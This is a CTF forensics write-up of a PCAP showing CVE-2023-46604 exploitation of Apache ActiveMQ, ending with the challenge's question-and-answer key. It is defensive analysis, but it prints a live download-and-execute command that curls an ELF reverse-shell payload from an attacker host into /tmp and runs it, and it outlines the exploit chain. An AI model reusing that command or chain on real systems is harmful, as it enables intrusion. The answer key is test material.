# OpenWire Lab: Apache ActiveMQ Exploitation (CVE-2023-46604)

## Executive Summary
This challenge involved investigating network traffic to uncover the exploitation of a vulnerable server. Through PCAP analysis, the attack was traced back to a malicious OpenWire packet that forced an Apache ActiveMQ instance to download and execute a remote XML configuration file. This led to Remote Code Execution (RCE) and the deployment of a Linux ELF reverse shell.

## Methodology & Analysis

### 1. Initial Access & Identifying the First C2
To analyze the PCAP file provided with the challenge, I used Wireshark. As soon as I opened the file, I saw a malformed `ExceptionResponse` packet. Knowing malformed packets are very often used to alter regular behavior by attackers, I went on to check what was going on.

Inspecting the contents of the packet, there was a clearly written URL: `http://146.190.21.92:8000/invoice.xml`. With a deeper inspection, it became clear some malicious manipulation was happening, more specifically of the `Throwable` class, invoking `org.springframework.context.support.ClassPathXmlApplicationContext`.

The conversation happened on port **61616** server-side.

Shortly after this packet, the compromised server sent an HTTP GET request to that exact URL. This confirmed that the IP **146.190.21.92** was the initial Command and Control (C2) server running the attack.

### 2. Exploit Execution Chain & Attacker Methodology
Following the TCP stream for the HTTP GET request allowed me to analyze the contents of the `invoice.xml` file and properly reconstruct the full execution flow of the exploit:

1. **Malicious Instantiation:** The downloaded Spring XML configuration file bypassed standard security controls by instantiating the **`java.lang.ProcessBuilder`** class.
2. **Forensic Artifact (PoC Modification):** Inspecting the XML arguments revealed a commented-out section containing the commands `open`, `-a`, and `calculator`. This is a standard macOS Proof of Concept (PoC) used by security researchers to demonstrate benign RCE—a fun little addition from the CTF creators.
3. **Command Execution:** The weaponized payload utilized the `init-method="start"` attribute to execute a `bash -c` command directly on the underlying host.
4. **Payload Staging:** The executed bash command was: 
   `curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker`
   This instructed the server to send a request to a second C2 at **128.199.52.72** to download another file named **`docker`**.
5. **Execution & Persistence:** The command then saved the payload to the `/tmp/` directory, granted it execution permissions, and ran it.

### 3. Payload Analysis & Post-Exploitation
Having a quick look at the `docker` file from the hex visualizer in Wireshark, I saw the `7F 45 4C 46` magic bytes. This confirmed that the file was not a legitimate containerization tool, but rather a standard Linux **ELF** executable designed to establish a reverse shell.

Further network analysis confirmed the successful execution of this payload. The PCAP shows the compromised server (`134.209.197.3`) initiating an outbound connection from port `43400` to the first C2 server (`146.190.21.92`) on port `443`. 

Once this reverse tunnel was established, the traffic volume shifted. The packet capture shows large, encrypted data streams (`SSLv2`) flowing from the C2 infrastructure towards the compromised server. This might indicate the attacker executing commands on the compromised machine, maybe destructive ones or preparing for data exfiltration not shown in this PCAP.

### 4. Vulnerability Identification & Mitigation
With the service and the exploitation method identified, Open-Source Intelligence (OSINT) confirmed this behavior as the signature for **CVE-2023-46604**, a critical RCE vulnerability in Apache ActiveMQ. Reviewing the vendor's patch notes revealed that the mitigation involved adding a validation step in the **`BaseDataStreamMarshaller.createThrowable`** class and method to ensure only valid `Throwable` classes could be instantiated, thereby breaking the exploit chain used in this intrusion.

---

## Challenge Questions & Answers

* **Q1: Can you provide the IP of the C2 server that communicated with our server?**
  * **Answer:** `146.190.21.92`
* **Q2: What is the port number of the service the adversary exploited?**
  * **Answer:** `61616`
* **Q3: What is the name of the service found to be vulnerable?**
  * **Answer:** `APACHE ACTIVEMQ`
* **Q4: What is the IP of the second C2 server?**
  * **Answer:** `128.199.52.72`
* **Q5: What is the name of the reverse shell executable dropped on the server?**
  * **Answer:** `docker`
* **Q6: What Java class was invoked by the XML file to run the exploit?**
  * **Answer:** `java.lang.ProcessBuilder`
* **Q7: Can you identify the CVE identifier associated with this vulnerability?**
  * **Answer:** `CVE-2023-46604`
* **Q8: In which Java class and method was this validation step added?**
  * **Answer:** `BaseDataStreamMarshaller.createThrowable`
